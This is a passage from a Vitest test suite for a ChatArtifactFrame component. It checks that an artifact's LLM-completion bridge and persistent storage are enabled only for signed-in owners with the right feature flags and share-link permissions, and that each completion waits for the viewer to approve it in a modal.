    const { connection } = await mountFrame({ telemetryOff: true })

    await capabilitiesOf(connection)

    expect(infoMock).not.toHaveBeenCalled()
  })

  it('keeps the frame for another artifact id in memory mode', async () => {
    const { wrapper } = await mountFrame()

    await wrapper.setProps({ artifactId: 'art_2' })
    await flushPromises()

    expect(captured).toHaveLength(1)
  })
})

describe('ChatArtifactFrame bridge capability', () => {
  const BRIDGE_INFO = {
    models: [
      {
        id: 'gpt-6-luna',
        name: 'GPT-6 Luna',
        providerId: 'openai',
        providerName: 'OpenAI',
        inputPricePerMillion: 0.1,
        outputPricePerMillion: 0.5,
      },
    ],
    defaultModelId: 'gpt-6-luna',
    remaining: { hour: 30, day: 200 },
    limits: { hour: 30, day: 200 },
  }

  function allowBridge() {
    loggedIn.value = true
    bridgeFeature.value = { enabled: true, active: true, variant: null }
    fetchMock.mockImplementation(async (url: string) => {
      if (url.endsWith('/bridge')) {
        return BRIDGE_INFO
      }

      if (url.endsWith('/complete')) {
        return {
          text: 'Plants make sugar',
          modelId: 'gpt-6-luna',
          usage: { inputTokens: 5, outputTokens: 4 },
          costUsd: 0.000001,
          remaining: { hour: 29, day: 199 },
        }
      }

      return { items: [], keys: 0, bytes: 0 }
    })
  }

  async function capabilitiesOf(connection: CapturedConnection) {
    const runtime = connectRuntime(connection)
    const result = await initialize(runtime)

    return { runtime, capabilities: result.hostContext.capabilities }
  }

  function findBridgeElement(testId: string): HTMLElement | null {
    return document.body.querySelector(`[data-testid="${testId}"]`)
  }

  function modelCalls(suffix: string) {
    return fetchMock.mock.calls.filter(([url]) => {
      return String(url).endsWith(suffix)
    })
  }

  async function waitForBridgeModal() {
    await vi.waitFor(() => {
      expect(findBridgeElement('artifact-bridge-allow')).not.toBeNull()
    })
    await flushPromises()
  }

  function pressPointerClick(element: HTMLElement | null) {
    element?.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true }))
    element?.dispatchEvent(
      new MouseEvent('click', { bubbles: true, detail: 1 }),
    )
  }

  async function waitForArmedAllow() {
    await vi.waitFor(() => {
      expect(findBridgeElement('artifact-bridge-allow')
        ?.hasAttribute('disabled')).toBe(false)
    })
    vi.setSystemTime(Date.now() + 1000)
  }

  beforeEach(() => {
    vi.spyOn(HTMLDialogElement.prototype, 'showModal')
      .mockImplementation(() => {})
    vi.spyOn(HTMLDialogElement.prototype, 'close')
      .mockImplementation(() => {})
  })

  afterEach(() => {
    vi.restoreAllMocks()
    vi.useRealTimers()
  })

  it('does not offer completions to a signed-out viewer', async () => {
    bridgeFeature.value = { enabled: true, active: true, variant: null }

    const { connection } = await mountFrame()
    const { capabilities } = await capabilitiesOf(connection)

    expect(capabilities.complete).toBe(false)
    expect(connection.handlers.complete).toBeUndefined()
  })

  it('does not offer completions when the artifacts.llm-bridge flag is off',
    async () => {
      loggedIn.value = true
      storageFeature.value = { enabled: true, active: true, variant: null }

      const { connection } = await mountFrame()
      const { capabilities } = await capabilitiesOf(connection)

      expect(capabilities.complete).toBe(false)
      expect(connection.handlers.complete).toBeUndefined()
    })

  it('does not offer completions for an artifact from a shared chat',
    async () => {
      allowBridge()

      const { connection } = await mountFrame({ source: 'shared' })
      const { capabilities } = await capabilitiesOf(connection)

      expect(capabilities.complete).toBe(false)
      expect(connection.handlers.complete).toBeUndefined()
    })

  it('does not offer completions without an artifact id', async () => {
    allowBridge()

    const { connection } = await mountFrame({ artifactId: null })
    const { capabilities } = await capabilitiesOf(connection)

    expect(capabilities.complete).toBe(false)
    expect(connection.handlers.complete).toBeUndefined()
  })

  it('offers completions to a signed-in owner with the flag on', async () => {
    allowBridge()

    const { connection } = await mountFrame()
    const { capabilities } = await capabilitiesOf(connection)

    expect(capabilities).toEqual({ storage: 'memory', complete: true })
    expect(connection.handlers.complete).toBeTypeOf('function')
  })

  it('treats a missing source as the owner', async () => {
    allowBridge()

    const { connection } = await mountFrame({ source: undefined })
    const { capabilities } = await capabilitiesOf(connection)

    expect(capabilities.complete).toBe(true)
  })

  it('offers persistent storage and completions together', async () => {
    allowBridge()
    storageFeature.value = { enabled: true, active: true, variant: null }

    const { connection } = await mountFrame()
    const { capabilities } = await capabilitiesOf(connection)

    expect(capabilities).toEqual({ storage: 'persistent', complete: true })
  })

  it('answers method-not-found for a completion without the capability',
    async () => {
      const { connection } = await mountFrame()
      const { runtime } = await capabilitiesOf(connection)

      await expect(runtime.request(METHODS.complete, { prompt: 'Hi' }))
        .rejects.toMatchObject({ code: ERROR_CODES.methodNotFound })
    })

  it('does not load the models or call the model at mount', async () => {
    allowBridge()

    const { connection } = await mountFrame()

    await capabilitiesOf(connection)
    await flushPromises()

    expect(fetchMock).not.toHaveBeenCalled()
    expect(findBridgeElement('artifact-bridge-modal')).toBeNull()
  })

  it('asks the viewer first and answers the runtime after Allow',
    async () => {
      vi.useFakeTimers({ toFake: ['Date'] })
      allowBridge()

      const { connection } = await mountFrame()
      const { runtime } = await capabilitiesOf(connection)
      const pending = runtime.request(METHODS.complete, {
        prompt: 'Explain photosynthesis',
        system: 'Be brief',
        maxOutputTokens: 200,
      })

      await waitForBridgeModal()

      expect(findBridgeElement('artifact-bridge-prompt')?.textContent)
        .toBe('Explain photosynthesis')
      expect(findBridgeElement('artifact-bridge-system')?.textContent)
        .toContain('Be brief')
      expect(modelCalls('/complete')).toHaveLength(0)

      pressPointerClick(findBridgeElement('artifact-bridge-allow'))
      await flushPromises()

      expect(modelCalls('/complete')).toHaveLength(0)

      await waitForArmedAllow()
      pressPointerClick(findBridgeElement('artifact-bridge-allow'))

      await expect(pending).resolves.toEqual({ text: 'Plants make sugar' })

      const [completeCall] = modelCalls('/complete')

      expect(completeCall![0]).toBe('/api/v1/artifacts/art_1/complete')
      expect(completeCall![1].body).toEqual({
        prompt: 'Explain photosynthesis',
        system: 'Be brief',
        modelId: 'gpt-6-luna',
        maxOutputTokens: 200,
      })
      await vi.waitFor(() => {
        expect(findBridgeElement('artifact-bridge-modal')).toBeNull()
      })
    })

  it('rejects the runtime as declined when the viewer cancels',
    async () => {
      allowBridge()

      const { connection } = await mountFrame()
      const { runtime } = await capabilitiesOf(connection)
      const pending = runtime.request(METHODS.complete, { prompt: 'Hi' })

      await waitForBridgeModal()
      pressPointerClick(findBridgeElement('artifact-bridge-cancel'))

      await expect(pending).rejects.toMatchObject({
        code: ERROR_CODES.declinedByViewer,
      })
      expect(modelCalls('/complete')).toHaveLength(0)
    })

  it('closes the open modal when the frame is removed', async () => {
    allowBridge()

    const { wrapper, connection } = await mountFrame()
    const { runtime } = await capabilitiesOf(connection)
    const pending = runtime.request(METHODS.complete, { prompt: 'Hi' })

    pending.catch(() => {})
    await waitForBridgeModal()
    wrapper.unmount()

    expect(findBridgeElement('artifact-bridge-modal')).toBeNull()
    expect(modelCalls('/complete')).toHaveLength(0)
  })

  it('refuses a second completion while the first one waits', async () => {
    allowBridge()

    const { connection } = await mountFrame()
    const { runtime } = await capabilitiesOf(connection)
    const first = runtime.request(METHODS.complete, { prompt: 'First' })

    await waitForBridgeModal()

    await expect(runtime.request(METHODS.complete, { prompt: 'Second' }))
      .rejects.toMatchObject({ code: ERROR_CODES.rateLimited })

    pressPointerClick(findBridgeElement('artifact-bridge-cancel'))
    await expect(first).rejects.toMatchObject({
      code: ERROR_CODES.declinedByViewer,
    })
  })

  it('rejects a completion with invalid params before asking the viewer',
    async () => {
      allowBridge()

      const { connection } = await mountFrame()
      const { runtime } = await capabilitiesOf(connection)

      await expect(runtime.request(METHODS.complete, {
        prompt: 'Hi',
        system: 'x'.repeat(2001),
      })).rejects.toMatchObject({ code: ERROR_CODES.invalidParams })
      expect(findBridgeElement('artifact-bridge-modal')).toBeNull()
    })

  it('remounts the frame when completions become available after mount',
    async () => {
      const { connection } = await mountFrame()

      expect(connection.handlers.complete).toBeUndefined()
      allowBridge()
      await flushPromises()

      expect(captured).toHaveLength(2)

      const { capabilities } = await capabilitiesOf(captured.at(-1)!)

      expect(capabilities.complete).toBe(true)
      expect(captured.at(-1)!.handlers.complete).toBeTypeOf('function')
    })

  it('remounts the frame when the flag turns off', async () => {
    allowBridge()

    await mountFrame()
    bridgeFeature.value = { enabled: true, active: false, variant: null }
    await flushPromises()

    expect(captured).toHaveLength(2)
    expect(captured.at(-1)!.handlers.complete).toBeUndefined()
  })

  it('remounts the frame when the viewer signs out', async () => {
    allowBridge()

    await mountFrame()
    loggedIn.value = false
    await flushPromises()

    expect(captured).toHaveLength(2)
    expect(captured.at(-1)!.handlers.complete).toBeUndefined()
  })

  it('remounts with the new artifact id for another artifact', async () => {
    allowBridge()

    const { wrapper } = await mountFrame()

    await wrapper.setProps({ artifactId: 'art_2' })
    await flushPromises()

    expect(captured).toHaveLength(2)

    const { runtime } = await capabilitiesOf(captured.at(-1)!)
    const pending = runtime.request(METHODS.complete, { prompt: 'Hi' })

    await waitForBridgeModal()

    expect(fetchMock).toHaveBeenCalledWith(
      '/api/v1/artifacts/art_2/bridge',
      { headers: {} },
    )

    pressPointerClick(findBridgeElement('artifact-bridge-cancel'))
    await expect(pending).rejects.toBeDefined()
  })

  it('keeps the frame for another artifact id when completions are off',
    async () => {
      const { wrapper } = await mountFrame()

      await wrapper.setProps({ artifactId: 'art_2' })
      await flushPromises()

      expect(captured).toHaveLength(1)
    })
})

describe('ChatArtifactFrame through a public link', () => {
  const SHARE_TOKEN = 'share-token-1'
  const ALL_ALLOWED = { storageAllowed: true, bridgeAllowed: true }

  function mountPublicShare(props: Record<string, unknown> = {}) {
    return mountFrame({
      source: 'public-share',
      shareToken: SHARE_TOKEN,
      shareCapabilities: ALL_ALLOWED,
      displayModeOverride: 'fullscreen',
      ...props,
    })
  }

  async function hostContextOf(connection: CapturedConnection) {
    const runtime = connectRuntime(connection)
    const result = await initialize(runtime)

    return { runtime, hostContext: result.hostContext }
  }

  function storageAndBridgeCalls() {
    return fetchMock.mock.calls.filter(([url]) => {
      return /\/(storage|bridge|complete)(\/|$)/.test(String(url))
    })
  }

  beforeEach(() => {
    fetchMock.mockResolvedValue({ items: [], keys: 0, bytes: 0 })
  })

  it('never reaches the server for an anonymous viewer, even when the '
    + 'link allows everything', async () => {
    storageFeature.value = { enabled: true, active: true, variant: null }
    bridgeFeature.value = { enabled: true, active: true, variant: null }

    const { connection } = await mountPublicShare()
    const { runtime, hostContext } = await hostContextOf(connection)

    expect(hostContext.capabilities).toEqual({
      storage: 'memory',
      complete: false,
    })
    expect(connection.handlers.storage).toBeUndefined()
    expect(connection.handlers.complete).toBeUndefined()

    await expect(runtime.request(METHODS.storageSet, {
      key: 'score',
      value: 1,
    })).rejects.toBeDefined()
    await expect(runtime.request(METHODS.complete, { prompt: 'Hi' }))
      .rejects.toBeDefined()
    await flushPromises()

    expect(storageAndBridgeCalls()).toHaveLength(0)
  })

  it('uses the display mode the page asks for', async () => {
    layout.value = 'docked'
    isFullWidth.value = false

    const { connection } = await mountPublicShare()
    const { hostContext } = await hostContextOf(connection)

    expect(hostContext.displayMode).toBe('fullscreen')
  })

  it('saves progress through the link for a signed-in viewer with the '
    + 'flag', async () => {
    loggedIn.value = true
    storageFeature.value = { enabled: true, active: true, variant: null }

    const { connection } = await mountPublicShare()
    const { hostContext } = await hostContextOf(connection)

    expect(hostContext.capabilities.storage).toBe('persistent')
    expect(fetchMock).toHaveBeenCalledWith(
      '/api/v1/artifacts/art_1/storage',
      { headers: { 'x-besidka-artifact-share': SHARE_TOKEN } },
    )
  })

  it('keeps memory storage when the link does not allow saving',
    async () => {
      loggedIn.value = true
      storageFeature.value = { enabled: true, active: true, variant: null }
      bridgeFeature.value = { enabled: true, active: true, variant: null }

      const { connection } = await mountPublicShare({
        shareCapabilities: { storageAllowed: false, bridgeAllowed: false },
      })
      const { hostContext } = await hostContextOf(connection)

      expect(hostContext.capabilities).toEqual({
        storage: 'memory',
        complete: false,
      })
      expect(storageAndBridgeCalls()).toHaveLength(0)
    })

  it('keeps memory storage when the viewer lacks the storage flag',
    async () => {
      loggedIn.value = true

      const { connection } = await mountPublicShare()
      const { hostContext } = await hostContextOf(connection)

      expect(hostContext.capabilities.storage).toBe('memory')
      expect(storageAndBridgeCalls()).toHaveLength(0)
    })

  it('offers completions only when the link and the viewer allow them',
    async () => {
      loggedIn.value = true
      bridgeFeature.value = { enabled: true, active: true, variant: null }

      const { connection } = await mountPublicShare({
        shareCapabilities: { storageAllowed: false, bridgeAllowed: true },
      })
      const { hostContext } = await hostContextOf(connection)

      expect(hostContext.capabilities).toEqual({
        storage: 'memory',
        complete: true,
      })
      expect(connection.handlers.complete).toBeTypeOf('function')
    })

  it('sends no share header for a shared chat even with a token',
    async () => {
      loggedIn.value = true
      storageFeature.value = { enabled: true, active: true, variant: null }

      const { connection } = await mountPublicShare({ source: 'shared' })
      const { hostContext } = await hostContextOf(connection)

      expect(hostContext.capabilities.storage).toBe('memory')
      expect(storageAndBridgeCalls()).toHaveLength(0)
    })
})
